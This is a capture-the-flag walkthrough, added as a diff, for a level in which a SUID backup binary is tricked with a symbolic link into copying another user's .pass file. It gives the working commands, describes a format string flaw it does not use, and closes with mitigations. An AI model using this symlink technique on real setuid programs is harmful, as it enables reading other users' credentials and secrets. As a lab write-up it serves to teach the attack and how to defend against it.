@@ -1,0 +1,219 @@
+# Level08 Walkthrough
+
+## Enumeration
+
+First, inspect the binary.
+
+```bash
+$ file level08
+
+level08: setuid setgid ELF 64-bit LSB executable, x86-64,
+version 1 (SYSV), dynamically linked (uses shared libs),
+for GNU/Linux 2.6.24, not stripped
+```
+
+Check its permissions.
+
+```bash
+$ ls -al level08
+
+-rwsr-s---+ 1 level09 users 12975 Oct 19 2016 level08
+```
+
+The important observation is:
+
+```text
+-rwsr-s---
+```
+
+The `s` bits indicate that this is a **SUID/SGID executable**.
+
+When we execute it, it will run with the effective privileges of `level09`.
+
+This immediately tells us that any file operations performed by the program may grant access to resources that our current user cannot normally read.
+
+---
+
+## Program behaviour
+
+Running the program without arguments shows:
+
+```bash
+$ ./level08
+
+Usage: ./level08 filename
+```
+
+Decompiling the binary reveals that it acts as a backup utility.
+
+Simplified logic:
+
+```c
+log_wrapper(logfile, "Starting back up: ", argv[1]);
+
+source = fopen(argv[1], "r");
+
+strcpy(path, "./backups/");
+strncat(path, argv[1], ...);
+
+destination = open(path, O_WRONLY | O_CREAT | O_APPEND, 0660);
+
+while ((c = fgetc(source)) != EOF)
+{
+    write(destination, &c, 1);
+}
+
+log_wrapper(logfile, "Finished back up ", argv[1]);
+```
+
+The program:
+
+1. Opens a user-supplied file.
+2. Creates a copy inside `./backups/`.
+3. Copies all bytes from source to destination.
+
+---
+
+## Looking for vulnerabilities
+
+The source file is completely controlled by the user:
+
+```c
+source = fopen(argv[1], "r");
+```
+
+There is no validation performed.
+
+The program does not check for:
+
+* symbolic links
+* allowed directories
+* ownership
+* canonical paths
+
+Since the binary runs with `level09` privileges, `fopen()` will execute with those elevated permissions.
+
+This means we may be able to trick the program into opening files that belong to `level09`.
+
+---
+
+## Exploiting symbolic links
+
+Create a symlink pointing to `level09`'s password file.
+
+```bash
+ln -s /home/users/level09/.pass pass
+```
+
+Verify:
+
+```bash
+$ ls -l pass
+
+pass -> /home/users/level09/.pass
+```
+
+Now execute the binary.
+
+```bash
+./level08 pass
+```
+
+Internally the program does:
+
+```c
+fopen("pass", "r");
+```
+
+The kernel automatically resolves the symlink and actually opens:
+
+```text
+/home/users/level09/.pass
+```
+
+using `level09`'s effective permissions.
+
+The contents are then copied into:
+
+```text
+./backups/pass
+```
+
+---
+
+## Retrieving the password
+
+Simply read the generated backup.
+
+```bash
+cat ./backups/pass
+```
+
+The password for `level09` is now revealed.
+
+---
+
+## Why the attack works
+
+The vulnerability is an **arbitrary file read via unsafe file handling in a SUID program**.
+
+The dangerous sequence is:
+
+```c
+source = fopen(argv[1], "r");
+```
+
+combined with:
+
+```text
+SUID binary
++
+User controlled path
++
+No symlink validation
+```
+
+This effectively turns the program into a privileged file copier.
+
+---
+
+## Additional observation
+
+The binary also contains a format string vulnerability.
+
+```c
+snprintf(..., argv[1]);
+```
+
+instead of:
+
+```c
+snprintf(..., "%s", argv[1]);
+```
+
+However, this is not necessary to solve the challenge.
+
+The symbolic link attack is significantly simpler and appears to be the intended solution.
+
+---
+
+## Vulnerability summary
+
+| Vulnerability               | Present | Used |
+| --------------------------- | ------- | ---- |
+| Unsafe SUID file access     | ✅       | ✅    |
+| Symbolic link following     | ✅       | ✅    |
+| Arbitrary file read         | ✅       | ✅    |
+| Format string vulnerability | ✅       | ❌    |
+| Path traversal possibility  | ✅       | ❌    |
+
+## Final takeaway
+
+Never allow a SUID program to open arbitrary user-controlled paths without validation.
+
+A secure implementation should:
+
+* reject symbolic links (`lstat`)
+* resolve canonical paths (`realpath`)
+* restrict access to specific directories
+* drop privileges before performing untrusted file operations
